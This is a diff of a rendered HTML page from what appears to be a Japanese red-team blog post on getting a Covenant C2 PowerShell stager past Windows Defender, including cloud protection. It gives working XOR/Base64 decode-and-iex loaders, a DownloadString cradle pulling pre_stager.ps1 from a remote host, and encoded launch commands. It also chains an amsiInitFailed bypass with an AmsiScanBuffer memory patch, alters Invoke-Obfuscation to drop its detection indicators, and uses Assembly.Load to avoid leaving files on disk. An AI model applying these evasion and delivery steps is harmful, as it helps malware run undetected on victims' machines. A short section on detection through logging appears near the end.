-</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$dec</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="nv">$Bytes</span><span class="p">){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$dec</span><span class="p">))</span>
-</span></span></code></pre></div><p>復号コードをAMSIバイパスコードの下に追記しファイルを保存。
-<img src="images/obfus_downloadstring.png" alt="obfus_downloadstring" loading="lazy" /></p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span><span class="p">;</span>
+<span class="nv">$str</span> <span class="p">=</span> <span class="s2">&#34;&lt;paste here&gt;&#34;</span><span class="p">;</span>
+<span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+<span class="nv">$enc</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="nv">$Bytes</span><span class="p">){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">};</span>
+<span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
+</code></pre></div><p>なお復号コードとして以下を使います。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span><span class="p">;</span>
+<span class="nv">$payload</span> <span class="p">=</span> <span class="s2">&#34;&lt;paste here&gt;&#34;</span><span class="p">;</span>
+<span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+<span class="nv">$dec</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="nv">$Bytes</span><span class="p">){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">};</span>
+<span class="nb">iex </span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$dec</span><span class="p">))</span>
+</code></pre></div><p>復号コードをAMSIバイパスコードの下に追記しファイルを保存。
+<img src="images/obfus_downloadstring.png" alt="obfus_downloadstring"></p>
 <p>Covenant の Listener ページから、当該リスナーにアップロードしホスティング。</p>
-<p><img src="images/lister_page.png" alt="lister_page" loading="lazy" /></p>
+<p><img src="images/lister_page.png" alt="lister_page"></p>
 <p><code>/ps_original.ps1</code> は記事の初めのほうにホスティングした Stager の ps1 ファイルです。</p>
 <p>Path を「/pre_stager.ps1」に設定し、作成したファイルをアップロードし準備完了です。</p>
 <h3 id="実行">実行</h3>
 <p>それでは改めてリアルタイムスキャンをオンの状態で（<strong>クラウド保護はオフ</strong>）、pre_stager.ps1 をダウンロードし実行するコードを実行しましょう。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/pre_stager.ps1&#39;</span><span class="p">)</span>
-</span></span></code></pre></div><p>この文字列を同じように Base64 + XOR で暗号化し、さらに復号 + IEX を行うコードを作成し、それをさらに Base64 エンコード化します（3重の構成）。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/pre_stager.ps1&#39;</span><span class="p">)</span>
+</code></pre></div><p>この文字列を同じように Base64 + XOR で暗号化し、さらに復号 + IEX を行うコードを作成し、それをさらに Base64 エンコード化します（3重の構成）。</p>
 <p>なお Base64 エンコードするコードは以下です。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="p">=</span> <span class="s1">&#39;&lt;paste here&gt;&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
-</span></span></code></pre></div><blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$str</span> <span class="p">=</span> <span class="s1">&#39;&lt;paste here&gt;&#39;</span>
+<span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+<span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
+</code></pre></div><blockquote>
 <p>PowerShell の -EncodedCommand オプションは UTF-16LE でエンコーディングされた文字でないと受け付けないので、他のプログラミング言語でエンコードする際は注意が必要です。</p>
 </blockquote>
 <p>出来上がった文字列で実行。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-sta</span> <span class="n">-nop</span> <span class="n">-ec</span> <span class="n">JABrAGUAeQAg</span><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span><span class="n">ZABlAGMAKQApADsA</span>
-</span></span></code></pre></div><p><img src="images/win_but_no_cloud.png" alt="win_but_no_cloud" loading="lazy" /></p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="n">-sta</span> <span class="n">-nop</span> <span class="n">-ec</span> <span class="n">JABrAGUAeQAg</span><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span><span class="n">ZABlAGMAKQApADsA</span>
+</code></pre></div><p><img src="images/win_but_no_cloud.png" alt="win_but_no_cloud"></p>
 <p>無事、実行することができました。</p>
 <h1 id="クラウド保護の検知回避">クラウド保護の検知回避</h1>
 <p>前項ではクラウド保護がオフの状態で、Grunt のアクティベーションができるようになりました。</p>
 <p>では次にクラウド保護をオンにして、もう一度やってみてください。</p>
-<p><img src="images/cloud_detect.png" alt="cloud_detect" loading="lazy" /></p>
+<p><img src="images/cloud_detect.png" alt="cloud_detect"></p>
 <p>ああ、検知されてしまいました。</p>
 <p>例外発生箇所の「<code>$Win32 = @&quot;</code>」の内容から、ダウンロードしたpre_stager.ps1に含まれるASBBypass のコードで検知されていることがわかります。</p>
 <p>AMSITrigger で検知された文字列を確認します。</p>
-<p><img src="images/amsitrigger_cloud.png" alt="amsitrigger_cloud" loading="lazy" /></p>
+<p><img src="images/amsitrigger_cloud.png" alt="amsitrigger_cloud"></p>
 <p><code>VirtualProtect</code> から<code>Marshal::Copy</code>の範囲で検知され、動的シグネチャ作成が作成されたようです。<br>
 通常プログラムでこれらの文字列が含まれるのは滅多にないので、この部分を検知されるのは妥当です。</p>
 <h2 id="拡大するシグネチャ検知">拡大するシグネチャ検知</h2>
 <p>VirtualProtect からMarshal::Copyのコードがまとまっているからダメなのでしょうか？それではこれらを別の場所に散らばせてみましょうか・・・？</p>
 <p>変更して、AMSITriggerを再度実行します。</p>
-<p><img src="images/amsitrigger_bad.png" alt="amsitrigger_bad" loading="lazy" /></p>
+<p><img src="images/amsitrigger_bad.png" alt="amsitrigger_bad"></p>
 <p>うわ！大惨事になってしまいました。もともと別の部分は問題なかったのに、散らばせたせいで検知されていなかったものも検知されるようになってしまいました。そう、こういった小手先のテクニックでは動的シグネチャの検知範囲が広がる恐れがあるのです。</p>
 <blockquote>
 <p>前の記事も記載したように、動的シグネチャの文字列は、一定期間たてば検知対象外に戻る模様です。</p>
@@ -452,20 +450,20 @@ ret
 <li><a href="danielbohannon/Invoke-Obfuscation">danielbohannon/Invoke-Obfuscation</a></li>
 </ul>
 <p>しかし残念なことに、本ツールは2019年で更新が停止しており、さらにそのままだとWindows Defenderに容易に検知されるようになってしまいました。</p>
-<p><img src="images/invoke-obfus_detect.png" alt="invoke-obfus_detect" loading="lazy" /></p>
+<p><img src="images/invoke-obfus_detect.png" alt="invoke-obfus_detect"></p>
 <blockquote>
 <p>Invoke-Obfuscation で作成した難読化コードが AMSI で検知される様子</p>
 </blockquote>
 <p>これは、難読化後コードにInvoke-Obfuscation でよく使われる特徴的な難読化コードが含まれており(<code>$env:ComsEpec ...</code>)、アンチウイルスソフトが検知しているものです。</p>
 <p>攻撃者たちはこれを避けるため、独自の難読化ツールを作成しています。確かに難読化ツールを自作すれば難読化ツール特有の文字列で検知されることはありません。</p>
 <p>ただし Invoke-Obfuscation の<code>string</code>機能による難読化は、いくつかの特徴を削除することで、難読化状態の検知を回避することができます。</p>
-<p><img src="images/invoke-obfus_string_filenotdetect.png" alt="invoke-obfus_string_filenotdetect" loading="lazy" /></p>
+<p><img src="images/invoke-obfus_string_filenotdetect.png" alt="invoke-obfus_string_filenotdetect"></p>
 <p>しかし string は 文字列の順序替え・結合に IEX を利用しています。はじめの方に説明したとおり、現在の PowerShell AMSI は IEX に渡される難読化解除後の文字列でもスキャンを行います。そのため静的に検知回避できたとしても、実行時にはアンチウイルスソフトに検知されてしまいます。</p>
-<p><img src="images/invoke-obfus_detect3.png" alt="invoke-obfus_detect3" loading="lazy" /></p>
+<p><img src="images/invoke-obfus_detect3.png" alt="invoke-obfus_detect3"></p>
 <blockquote>
 <h4 id="token-による難読化は">Token による難読化は？</h4>
 <p>Invoke-Obfuscation の Token 難読化はよりステルスだとされます。しかしこれを使ってpre_stagerを難読化しても、バイパスコードの場合は検知されてしまいます。</p>
-<p><img src="images/invoke-obfus_detect2.png" alt="invoke-obfus_detect2" loading="lazy" /></p>
+<p><img src="images/invoke-obfus_detect2.png" alt="invoke-obfus_detect2"></p>
 <p>AMSIScanBufferをパッチするバイパスコードは Win32 APIを利用することもあり、難読化しても非常に検知されやすい特徴をもっているのです。（Windows Defender の機械学習エンジンが優秀ということもあります）
 これをみてわかるとおり、クラウド保護の PowerShell 用 スキャンエンジンは非常に強固であり、生の PowerShell を用いて メモリパッチするタイプの AMSI バイパスはそのままでは使い物にならないといってよいでしょう。</p>
 </blockquote>
@@ -473,19 +471,19 @@ ret
 <p>ここでどう検知回避するか、これは Red Teamer でも情報が共有されていないため、調べても正解はありませんでした。</p>
 <p>そこで私は amsiInitFailed タイプの AMSI バイパスと併用する手段を考えました。</p>
 <p>amsiInitFailed タイプのバイパス手法は全てが PowerShell 領域で完結するコードであるため、難読化コードが検知されにくいです。これは amsi.fail で生成されたコードが全く検知されないことからも明らかです。</p>
-<p><img src="images/amsiinitfailed_notdetect.png" alt="amsiinitfailed_notdetect" loading="lazy" /></p>
+<p><img src="images/amsiinitfailed_notdetect.png" alt="amsiinitfailed_notdetect"></p>
 <p>しかし最初に説明したとおり、amsiInitFailed タイプの AMSI バイパスは Assembly.Load() における AMSI のバイパスはできません。そこで、amsiInitFailed タイプをコードの初めに記載し、 PowerShell 空間での AMSI バイパスを実現します。次に AMSIScanBuffer パッチタイプを次の行に書いて Assembly.Load() を含めた完全なバイパスを行います。</p>
 <p>amsiInitFailed タイプの AMSI バイパスで IEX による難読化解除後の検知がバイパスされるので、 AMSIScanBuffer バイパスコードはダウンロード時の難読化状態のみがスキャンされます。これなら IEX を使った難読化が有効に動作します。</p>
-<p><img src="images/amsibypass_structure.png" alt="amsibypass_structure" loading="lazy" /></p>
+<p><img src="images/amsibypass_structure.png" alt="amsibypass_structure"></p>
 <h2 id="コード変更による検知回避の試み">コード変更による検知回避の試み</h2>
 <p>今までの説明をもとに、検知回避を試みます。</p>
 <h3 id="1-invoke-obfuscation-の修正">1. Invoke-Obfuscation の修正</h3>
 <p>まずは Invoke-Obfuscation の修正です。今回は string 難読化の修正を行うため、<code>Out-ObfuscatedStringCommand.ps1</code> を変更します。</p>
 <h4 id="invokeexpressionsyntax">InvokeExpressionSyntax</h4>
-<p><img src="images/fix_obfuscatedstringcommand.png" alt="fix_obfuscatedstringcommand" loading="lazy" /></p>
+<p><img src="images/fix_obfuscatedstringcommand.png" alt="fix_obfuscatedstringcommand"></p>
 <p>881 ~ 886行目の <code>InvokeExpressionSyntax</code> をコメントアウトします。これは IEX の代替表現ですが、この表現は特徴的であり、Invoke-Obfuscation を使ったことを示すインジケータとなってしまいます。</p>
 <h4 id="setofsvarsyntax-setofsvarbacksyntax">SetOfsVarSyntax, SetOfsVarBackSyntax</h4>
-<p><img src="images/fix_obfuscatedstringcommand2.png" alt="fix_obfuscatedstringcommand2" loading="lazy" /></p>
+<p><img src="images/fix_obfuscatedstringcommand2.png" alt="fix_obfuscatedstringcommand2"></p>
 <p>751, 775, 802 行目の JoinOptions をコメントアウトします。このコードも難読化のバリエーションを増やすシンタックスですが、「Variable:OFS」「&lsquo;OFS&rsquo;」という Invoke-Obfuscation 特有の表現が使われています。</p>
 <p>このコードを消すことによって、string 難読化は検知されにくくなります（ただし完全ではない）。</p>
 <h3 id="2-pre_stagerps1-の修正">2. pre_stager.ps1 の修正</h3>
@@ -493,16 +491,16 @@ ret
 <h4 id="2-a-検知されそうなコードのbase64エンコード">2-a. 検知されそうなコードのBase64エンコード</h4>
 <p>AMSITriggerで確認したように、VirtualProtect から Marshal::Copy までのコードは通常のPowershellコードでは稀であり、string 難読化してもアンチウイルスソフトに検知される可能性があります。</p>
 <p>そのため、この3行は行ごとにBase64 エンコードしておきましょう。はじめにamsiInitFailedでAMSIバイパスを行うことから、 IEX 難読化解除後の文字列はスキャンされないので問題ありません。お好みで XOR 暗号化してもよいです。</p>
-<p><img src="images/base64_sensitive_code.png" alt="base64_sensitive_code" loading="lazy" /></p>
+<p><img src="images/base64_sensitive_code.png" alt="base64_sensitive_code"></p>
 <h4 id="2-b-string-難読化">2-b. string 難読化</h4>
 <p><code>Out-ObfuscatedStringCommand</code> を用いて pre_stager.ps1 を難読化します。出力ファイルは「pre_stager_enc.ps1」とします。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-Obfuscation</span><span class="p">.</span><span class="n">psd1</span>
-</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="nb">Out-ObfuscatedStringCommand</span> <span class="n">-Path</span> <span class="n">pre_stager</span><span class="p">.</span><span class="n">ps1</span> <span class="p">&gt;</span> <span class="n">pre_stager_enc</span><span class="p">.</span><span class="n">ps1</span>
-</span></span></code></pre></div><h4 id="2-c-amsiinitfailed-コードの追加">2-c. amsiInitFailed コードの追加</h4>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-Obfuscation</span><span class="p">.</span><span class="n">psd1</span>
+<span class="p">&gt;</span> <span class="nb">Out-ObfuscatedStringCommand</span> <span class="n">-Path</span> <span class="n">pre_stager</span><span class="p">.</span><span class="n">ps1</span> <span class="p">&gt;</span> <span class="n">pre_stager_enc</span><span class="p">.</span><span class="n">ps1</span>
+</code></pre></div><h4 id="2-c-amsiinitfailed-コードの追加">2-c. amsiInitFailed コードの追加</h4>
 <p><a href="https://amsi.fail/">amsi.fail</a> にて難読化された amsiInitFailed バイパスコードを生成し、 pre_stager_enc.ps1 の1行目に追加します。</p>
 <h4 id="2-d-amsitrigger-で検知テスト">2-d. AMSITrigger で検知テスト</h4>
 <p>リアルタイムスキャン、クラウド保護をオンにして、 AMSITrigger で pre_stager_enc.ps1 を検知テストします。</p>
-<p><img src="images/amsitrigger_cloud_ok.png" alt="amsitrigger_cloud_ok" loading="lazy" /></p>
+<p><img src="images/amsitrigger_cloud_ok.png" alt="amsitrigger_cloud_ok"></p>
 <p>クラウド保護が検知しなければ、1行目の amsiInitFailed バイパスで 2行目以降の IEX は検知しないため問題ないとわかります。</p>
 <p>もし検知された場合は Out-ObfuscatedStringCommand の難読化で検知されたと思われるため、ステップ2-b からやり直してください。</p>
 <h2 id="実行-1">実行</h2>
@@ -512,46 +510,46 @@ ret
 ※ファイルパスは「/pre_stager.ps1」にしておくと、中盤で作成したコマンドライン引数を変える必要がないので楽です。</p>
 </blockquote>
 <p>準備ができたら実行しましょう。</p>
-<p><img src="images/win_with_cloud.png" alt="win_with_cloud" loading="lazy" /></p>
+<p><img src="images/win_with_cloud.png" alt="win_with_cloud"></p>
 <p><strong>検知回避に成功しました！</strong></p>
 <h2 id="adv-さらなるステルス化の試み-add-type未使用">Adv: さらなるステルス化の試み (Add-Type未使用)</h2>
 <p>ここまででもWindows Defenderの検知を回避することができますが、ステルスのためにまだやれることがあります。</p>
 <h3 id="add-type-による-cs-ファイル生成に注意">Add-Type による cs ファイル生成に注意</h3>
 <p>ASBBypass は PowerShell 内で C# コードを作成し、 Add-Type コマンドレットによって C# コードをコンパイル・実行して Win32 API を呼び出していました。しかしながらこれを用いるとステルス性に問題が発生します。</p>
 <p>Add-Type を使うと C# コードの場合、PC 内部でコードのコンパイルが行われます。そのときコンパイル対象の C# コードは実行ユーザの Temp フォルダに保存されてしまうのです。
-<img src="images/add-type_file.png" alt="add-type_file" loading="lazy" /></p>
+<img src="images/add-type_file.png" alt="add-type_file"></p>
 <p>これでは完全なファイルレスとは呼べません。csファイル作成を避けるには Add-Type を使わない方法を考える必要があります。そこで Powershell 内で Add-Type を使わず Win32 API を使う方法として、  .NET アセンブリを ps1 ファイルに内蔵し、Assembly.Load() で読み込む方法があります。</p>
 <h3 id="win32api-定義だけをアセンブリ化する">Win32API 定義だけをアセンブリ化する</h3>
 <p>ネット上に記載されている <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#amsi-buffer-patch---in-memory">AMSIBufferBypass のインメモリパッチ手法</a>は、全てのバイパスコードを cs で作成しアセンブリ化し、Load しています。しかしその手法だと Assembly.Load() の際、AMSI を通したアンチウイルスソフトとの検知回避バトルが発生します。</p>
 <p>それを避けるため、私は Win32 API 定義だけをアセンブリ化することにしました。こうすることによって、Win32 API 定義だけでは不審ではないので検知されず、また ASBBypass のパッチコードは amsiInitFailed バイパス + string 難読化によって検知されません。</p>
 <h4 id="win32-クラスアセンブリの作成">Win32 クラスアセンブリの作成</h4>
 <p>まずは ASBBypass に含まれる Win32 クラス定義の部分を win32.cs として保存します。</p>
-<p><img src="images/win32_cs.png" alt="win32_cs" loading="lazy" /></p>
+<p><img src="images/win32_cs.png" alt="win32_cs"></p>
 <p>次に csc.exe で csファイルをコンパイルし、win32.dll を作成します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-target</span><span class="err">:</span><span class="n">library</span> <span class="n">win32</span><span class="p">.</span><span class="n">cs</span>
-</span></span></code></pre></div><p>dll ファイルを Base64 化し、クリップボードにコピーします。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$filename</span> <span class="p">=</span><span class="s2">&#34;win32.dll&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">|</span> <span class="n">clip</span>
-</span></span></code></pre></div><p>これを Assembly.Load で正常に読み込まれるかチェックをしましょう。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$dat</span> <span class="p">=</span> <span class="s2">&#34;TVqQAAMAAA(..snip..)AAAAAAAAAAAAAAAAAAAAAAAA=&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$dat</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">GAC</span>    <span class="n">Version</span>        <span class="n">Location</span>
-</span></span><span class="line"><span class="cl"><span class="p">---</span>    <span class="p">-------</span>        <span class="p">--------</span>
-</span></span><span class="line"><span class="cl"><span class="n">False</span>  <span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Win32]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">IsPublic</span> <span class="n">IsSerial</span> <span class="n">Name</span>                                     <span class="n">BaseType</span>
-</span></span><span class="line"><span class="cl"><span class="p">--------</span> <span class="p">--------</span> <span class="p">----</span>                                     <span class="p">--------</span>
-</span></span><span class="line"><span class="cl"><span class="n">True</span>     <span class="n">False</span>    <span class="n">Win32</span>                                    <span class="n">System</span><span class="p">.</span><span class="n">Object</span>
-</span></span></code></pre></div><p>正常に読み込まれることを確認したので、pre_stager.ps1 の該当箇所を置き換えます。</p>
-<p><img src="images/win32_assembly.png" alt="win32_assembly" loading="lazy" /></p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-target</span><span class="err">:</span><span class="n">library</span> <span class="n">win32</span><span class="p">.</span><span class="n">cs</span>
+</code></pre></div><p>dll ファイルを Base64 化し、クリップボードにコピーします。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$filename</span> <span class="p">=</span><span class="s2">&#34;win32.dll&#34;</span>
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">|</span> <span class="n">clip</span>
+</code></pre></div><p>これを Assembly.Load で正常に読み込まれるかチェックをしましょう。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$dat</span> <span class="p">=</span> <span class="s2">&#34;TVqQAAMAAA(..snip..)AAAAAAAAAAAAAAAAAAAAAAAA=&#34;</span>
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$dat</span><span class="p">))</span>
+
+<span class="n">GAC</span>    <span class="n">Version</span>        <span class="n">Location</span>
+<span class="p">---</span>    <span class="p">-------</span>        <span class="p">--------</span>
+<span class="n">False</span>  <span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span>
+
+
+<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Win32]</span>
+
+<span class="n">IsPublic</span> <span class="n">IsSerial</span> <span class="n">Name</span>                                     <span class="n">BaseType</span>
+<span class="p">--------</span> <span class="p">--------</span> <span class="p">----</span>                                     <span class="p">--------</span>
+<span class="n">True</span>     <span class="n">False</span>    <span class="n">Win32</span>                                    <span class="n">System</span><span class="p">.</span><span class="n">Object</span>
+</code></pre></div><p>正常に読み込まれることを確認したので、pre_stager.ps1 の該当箇所を置き換えます。</p>
+<p><img src="images/win32_assembly.png" alt="win32_assembly"></p>
 <p>これで完成です。</p>
 <h3 id="実行-2">実行</h3>
 <p>実際にコードを実行し、cs ファイルが生成されないことを確認しましょう。</p>
-<p><img src="images/fileless_completely.png" alt="fileless_completely" loading="lazy" /></p>
+<p><img src="images/fileless_completely.png" alt="fileless_completely"></p>
 <p><strong>勝利です！</strong></p>
 <hr>
 <h1 id="まとめ">まとめ</h1>
@@ -564,7 +562,7 @@ ret
 <h2 id="検知">検知</h2>
 <p>Windows Defenderの検知回避ができたとはいえ、PowerShellの悪用は複数の観点で検出が可能です。</p>
 <p>一番検出しやすいのは Windows イベントログでしょうか。</p>
-<p><img src="images/PowerShellLogging.jpeg" alt="PowerShellLogging" loading="lazy" /></p>
+<p><img src="images/PowerShellLogging.jpeg" alt="PowerShellLogging"></p>
 <blockquote>
 <p><a href="https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/">https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/</a></p>
 </blockquote>
@@ -668,13 +666,13 @@ ret
 
 
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
-
+    
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
 
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
 
+<script src="/js/mediumish.js"></script>
 
-<script src="https://www.shutingrz.com/js/mediumish.e4b90c58dfa15ac82caf2edfa01e5fd047e17bc15e6babe5c0e442a4407d0b25.js" integrity="sha256-5LkMWN&#43;hWsgsry7foB5f0Efhe8Fea6vlwORCpEB9CyU="></script>
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -687,5 +685,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
+
     </body>
 </html>
